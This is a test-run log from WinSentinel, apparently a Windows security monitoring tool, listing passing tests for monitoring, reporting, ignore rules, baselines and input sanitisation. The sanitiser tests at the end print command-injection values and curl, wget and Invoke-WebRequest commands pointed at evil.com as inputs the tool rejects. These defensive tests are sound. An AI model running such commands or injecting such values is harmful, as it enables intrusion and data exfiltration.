  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsAllUsersStartupPersistence [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsHostsFileDeletion [1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.ComputeFileHash_ReturnsNullForNonexistentFile [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_IgnoresNonScriptInTemp [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_IgnoresNonExecutableDownload [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_MediumRisk_AlertsOnly [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.CheckSystem32Drop_OnlyTriggersForCreated [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.CheckExtensionMasquerading_IgnoresNonDangerousDoubleExt [2 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_IgnoresNonHostsFileInEtcDir [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_IgnoresNonExecutableInSystem32 [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.CheckExtensionMasquerading_IgnoresSingleExtension [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsHostsFileModification [1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsNewJobFile [< 1 ms]
  Passed WinSentinel.Tests.Audits.UpdateAuditTests.RunAuditAsync_ProducesFindings [< 1 ms]
  Passed WinSentinel.Tests.Audits.SystemAuditTests.RunAuditAsync_ChecksUac [< 1 ms]
  Passed WinSentinel.Tests.Audits.UpdateAuditTests.RunAuditAsync_ScoreIsValid [< 1 ms]
  Passed WinSentinel.Tests.Audits.DefenderAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Models.ScheduleSettingsTests.SaveAndLoad_RoundTrips [34 ms]
  Passed WinSentinel.Tests.Models.ScheduleSettingsTests.EffectiveInterval_ReturnsCorrectMinutes(interval: Hourly, expectedMinutes: 60) [< 1 ms]
  Passed WinSentinel.Tests.Models.ScheduleSettingsTests.EffectiveInterval_ReturnsCorrectMinutes(interval: Daily, expectedMinutes: 1440) [< 1 ms]
  Passed WinSentinel.Tests.Models.ScheduleSettingsTests.EffectiveInterval_Custom_UsesCustomMinutes [< 1 ms]
  Passed WinSentinel.Tests.Models.ScheduleSettingsTests.EffectiveInterval_Custom_EnforcesMinimum5Minutes [< 1 ms]
  Passed WinSentinel.Tests.Models.ScheduleSettingsTests.Defaults_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Services.TraySettingsTests.TrayNotification_ShouldNotify_RespectsSetting [< 1 ms]
  Passed WinSentinel.Tests.Services.TraySettingsTests.TrayNotification_ScoreDropped_Detected [< 1 ms]
  Passed WinSentinel.Tests.Services.TraySettingsTests.Settings_SaveAndLoad_PreservesTrayValues [4 ms]
  Passed WinSentinel.Tests.Services.TraySettingsTests.DefaultSettings_TrayValues [< 1 ms]
  Passed WinSentinel.Tests.Services.TraySettingsTests.TrayNotification_CriticalFindings_Detected [< 1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.RunScanNowAsync_PreventsConcurrentScans [5 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.Start_WithEnabledSettings_Activates [< 1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.Stop_DeactivatesScheduler [< 1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.UpdateSettings_RestartsWithNewSettings [15 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.Dispose_MultipleCallsDoesNotThrow [< 1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.RunScanNowAsync_ExecutesScanAndRaisesEvent [17 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.UpdateSettings_DisablingStopsScheduler [1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.NextScanTime_CalculatesCorrectly [< 1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.IsScanRunning_DefaultsFalse [< 1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.Dispose_ThrowsOnSubsequentStart [< 1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.NextScanTime_NullWhenDisabled [< 1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.Constructor_LoadsSettings [< 1 ms]
  Passed WinSentinel.Tests.Services.ScanSchedulerTests.Start_WithDisabledSettings_DoesNotActivate [< 1 ms]
  Passed WinSentinel.Tests.Services.StartupManagerTests.IsRegistered_ReturnsBoolean [< 1 ms]
  Passed WinSentinel.Tests.Services.StartupManagerTests.SetStartup_EnableAndDisable [2 ms]
  Passed WinSentinel.Tests.Services.StartupManagerTests.Register_And_Unregister_WorksRoundTrip [< 1 ms]
  Passed WinSentinel.Tests.Services.StartupManagerTests.Unregister_WhenNotRegistered_Succeeds [< 1 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.KillProcess_RecordedInHistory [1 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.ExecuteFixCommand_NoCommand_ReturnsFailed [1 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.Undo_NonExistentRemediation_ReturnsFailed [1 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.Undo_QuarantinedFile_RestoresOriginal [19 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.GetRecent_ReturnsNewestFirst [1 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.Undo_AlreadyUndone_ReturnsFailed [6 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.KillProcess_NonExistentPid_ReturnsFailed [5 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.ExecuteFixCommand_SimpleCommand_Executes [49 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.QuarantineFile_ExistingFile_MovesToQuarantine [6 ms]
  Passed WinSentinel.Tests.Agent.AutoRemediatorTests.QuarantineFile_NonExistentFile_ReturnsFailed [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatLogTests.Add_And_GetAll_Works [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatLogTests.SetMaxSize_Works [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatLogTests.GetToday_Filters_Correctly [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatLogTests.Empty_Log_Returns_Empty_Collections [1 ms]
  Passed WinSentinel.Tests.Agent.ThreatLogTests.ThreatDetected_Event_Fires [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatLogTests.GetTodayCount_Returns_Correct_Count [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatLogTests.MaxSize_Trims_Old_Events [< 1 ms]
  Passed WinSentinel.Tests.Agent.ThreatLogTests.GetRecent_Limits_Results [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_IsValidJson [15 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_FailedModule_ShowsError [4 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_CorrectScore [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsRemediation [4 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_ContainsMachineName [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsFixCommand [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_FailedModule_ShowsError [5 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_ContainsModules [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateFilename_HtmlFormat_CorrectExtension [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsPassedChecksCollapsible [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_ContainsRequiredFields [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_IsValidMarkdown_NoHtmlInjection [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_ContainsRemediation [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsInlineCSS [1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsMachineName [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_ContainsFindingSeverity [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsGrade [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateFilename_JsonFormat_CorrectExtension [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsGradeBadge [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateFilename_UsesProvidedTimestamp [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsModuleBreakdown [1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsFooter [1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_EmptyReport_IsValidJson [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.SaveReport_TextFormat_CreatesFile [30 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_ContainsModuleBreakdown [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsModuleStatusIcons [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsModuleBreakdown [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.SaveReport_CreatesDirectoryIfNeeded [3 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_ContainsFindings [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_ContainsRemediation [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateFilename_MarkdownFormat_CorrectExtension [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_WithoutTrend_NoTrendSection [1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsSeverityLabels [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_ContainsSummary [3 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.SaveReport_HtmlFormat_CreatesFile [45 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsScore [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_WithTrend_ContainsBestWorstAverage [2 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.SaveReport_MarkdownFormat_CreatesFile [38 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_FailedModule_ShowsError [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsProgressBar [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_EmptyReport_DoesNotThrow [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsTitle [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_WithTrend_ContainsTrend [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_ContainsHeader [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_EmptyReport_DoesNotThrow [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_WithTrend_ContainsTrendSection [1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsSummaryTable [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsMachineName [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ModuleBreakdownHasCorrectColumnCount [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_NoActionableFindings_SkipsModule [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsSeverityBadges [1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_EmptyReport_DoesNotThrow [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsFindings [2 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.SaveReport_JsonFormat_CreatesValidJson [31 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_ContainsMachineName [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsOverallScore [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsDetailedFindings [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateFilename_TextFormat_CorrectExtension [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsDoctype [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_ContainsFixCommand [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_ContainsFindings [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_WithTrend_ContainsTrendSection [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_ContainsRemediation [1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_WithTrend_ContainsTrendData [2 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateJsonReport_WithoutTrend_NoTrendData [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsInfoCollapsible [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateTextReport_ContainsScore [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsTitle [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateHtmlReport_HtmlEncodesSpecialChars [1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_WithoutTrend_NoTrendSection [< 1 ms]
  Passed WinSentinel.Tests.Services.ReportGeneratorTests.GenerateMarkdownReport_ContainsFooter [< 1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.IgnoreRule_IsExpired_FutureDate_ReturnsFalse [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_ExactMode_CaseInsensitive [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRulesToReport_RecalculatesScore [27 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.RemoveRule_NonExistentId_ReturnsFalse [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.IgnoreRule_IsActive_EnabledAndNotExpired [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_SeverityFilter_Matches [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_SeverityFilter_WrongSeverity [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRulesToReport_SeverityScopedRule [6 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.GetRule_CaseInsensitiveId [4 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.AddRule_WithAllOptions_SetsAllProperties [12 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_ModuleFilter_FallsBackToFindingCategory [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRulesToReport_DisabledRule_NotApplied [5 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.IgnoreRule_IsExpired_NoExpiry_ReturnsFalse [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRulesToReport_NoRules_ReturnsOriginal [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.RemoveRule_ExistingId_ReturnsTrue [4 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.AddRule_PersistsToFile [22 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.PurgeExpiredRules_RemovesOnlyExpired [20 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.GetActiveRules_ExcludesDisabled [4 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ToggleRule_NonExistentId_ReturnsFalse [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ClearAllRules_RemovesAll [6 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_ModuleFilter_WrongModule [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_RegexMode_InvalidRegex_ReturnsFalse [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.IgnoreRule_IsActive_EnabledButExpired [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_RegexMode_NoMatch [10 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.IsIgnored_NoMatchingRule_ReturnsFalse [6 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ToggleRule_DisableAndEnable [5 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.IgnoreFilterResult_TotalFindings_Correct [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.GetRuleMatchCounts_CountsCorrectly [4 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.AddRule_MultipleThenRemoveOne_RestPersist [6 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.AddRule_BasicPattern_CreatesRule [4 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.AddRule_InvalidRegex_ThrowsArgumentException [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.GetActiveRules_ExcludesExpired [4 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_ContainsMode_CaseInsensitive [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRules_EmptyFindings_ReturnsEmptyResult [4 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.AddRule_MultipleRules_AllPersisted [5 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.GetRule_NonExistentId_ReturnsNull [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.GetRule_ExistingId_ReturnsRule [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.AddRule_EmptyPattern_ThrowsArgumentException [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_ContainsMode_NoMatch [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRules_MatchingRule_SuppressesFinding [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRulesToReport_ExpiredRule_NotApplied [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_ExactMode_PartialDoesNotMatch [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRulesToReport_SuppressesMatchingFindings [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.IsIgnored_MatchingRule_ReturnsTrue [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_CombinedFilters [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRules_NoRules_AllFindingsActive [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.PurgeExpiredRules_NoExpired_ReturnsZero [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRulesToReport_MultipleRules_SuppressesAll [5 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRulesToReport_PreservesAuditResultMetadata [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.IgnoreRule_IsExpired_PastDate_ReturnsTrue [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_ExactMode_MatchesExactly [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_ModuleFilter_Matches [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.AddRule_ExactMode_CreatesCorrectly [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.IgnoreRule_IsActive_DisabledButNotExpired [2 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_ModuleFilter_ContainsMatch [1 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ApplyRulesToReport_ModuleScopedRule [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.ClearAllRules_EmptyList_ReturnsZero [3 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.MatchesFinding_RegexMode_Matches [4 ms]
  Passed WinSentinel.Tests.Services.IgnoreRuleServiceTests.AddRule_RegexMode_ValidPattern [3 ms]
  Passed WinSentinel.Tests.Agent.AgentStateTests.New_AgentState_Has_Valid_Defaults [4 ms]
  Passed WinSentinel.Tests.Agent.AgentStateTests.ToSnapshot_Captures_Current_State [4 ms]
  Passed WinSentinel.Tests.Agent.AgentStateTests.ActiveModules_Only_Includes_True_Entries [< 1 ms]
  Passed WinSentinel.Tests.Agent.AgentStateTests.ThreatsDetectedToday_Uses_ThreatLog [< 1 ms]
  Passed WinSentinel.Tests.Agent.AgentStateTests.ThreatsDetectedToday_Returns_Zero_Without_ThreatLog [< 1 ms]
  Passed WinSentinel.Tests.Agent.AgentStateTests.Uptime_Increases_Over_Time [< 1 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.CheckBaseline_DetectsUnchanged [45 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.LoadBaseline_ReturnsNullForMissing [1 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.DeleteBaseline_ReturnsFalseForMissing [1 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_AcceptsValidNames [4 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.CheckBaseline_ThrowsForMissing [2 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_ThrowsOnInvalidChars [2 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_ThrowsOnDuplicate [4 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.CheckBaseline_ScoreComparison [23 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.BaselineCheckResult_PassedWhenNoRegressions [1 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.BaselineExists_TrueWhenSaved [3 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.CheckBaseline_DetectsResolved [22 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.BaselineExists_FalseWhenMissing [1 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.ListBaselines_EmptyWhenNone [3 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_CreatesJsonFile [3 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.CheckBaseline_ModuleDeviations [23 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_ThrowsOnTooLongName [1 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.ListBaselines_IncludesDescriptions [23 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.CheckBaseline_DetectsRegressions [22 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_ThrowsOnEmptyName [1 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_SetsMachineName [3 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_SetsGrade [3 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.CheckBaseline_CriticalRegressionCount [22 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_OverwriteWithForce [3 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_CapturesFindingCounts [4 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.BaselineModuleDeviation_Status [2 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveAndCheck_MultipleModules [22 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.ListBaselines_ReturnsAll [23 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_CapturesFindings [4 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.BaselineCheckResult_FailedOnScoreDrop [2 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.SaveBaseline_CapturesModuleScores [3 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.LoadBaseline_RoundTrips [23 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.DeleteBaseline_RemovesFile [3 ms]
  Passed WinSentinel.Tests.Services.BaselineServiceTests.CheckBaseline_ScoreImproved [23 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.ChatPayload_Roundtrips [18 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.Response_With_Payload_Roundtrips [13 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.ScanProgressPayload_Roundtrips [2 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.ErrorResponse_Serializes_Correctly [< 1 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.All_MessageTypes_Serialize_As_Strings [< 1 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.Config_Snapshot_Roundtrips [8 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.Invalid_Json_Returns_Null [1 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.RunFixPayload_Roundtrips [1 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.Event_Without_RequestId_Works [8 ms]
  Passed WinSentinel.Tests.Agent.IpcMessageTests.Request_Serializes_And_Deserializes [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_InvalidOrInjection_ReturnsNull(input: "not-an-ip") [1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_InvalidOrInjection_ReturnsNull(input: "192.168.1.1 & echo pwned") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_InvalidOrInjection_ReturnsNull(input: "999.999.999.999") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_InvalidOrInjection_ReturnsNull(input: "$(whoami)") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_InvalidOrInjection_ReturnsNull(input: "192.168.1.1|net user") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeIpAddress_InvalidOrInjection_ReturnsNull(input: "192.168.1.1;whoami") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.ValidateFilePath_ProtectedProgramFiles_ReturnsNull [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_NetworkExfiltration_ReturnsReason(input: "curl http://evil.com/exfil") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_NetworkExfiltration_ReturnsReason(input: "wget http://evil.com/malware") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_NetworkExfiltration_ReturnsReason(input: "Invoke-WebRequest http://evil.com/payload") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.CheckDangerousCommand_NetworkExfiltration_ReturnsReason(input: "iwr http://evil.com") [< 1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_ValidUsernames_ReturnsTrimmed(input: "user_name", expected: "user_name") [1 ms]
  Passed WinSentinel.Tests.InputSanitizerTests.SanitizeUsername_ValidUsernames_ReturnsTrimmed(input: "john.doe", expected: "john.doe") [< 1 ms]
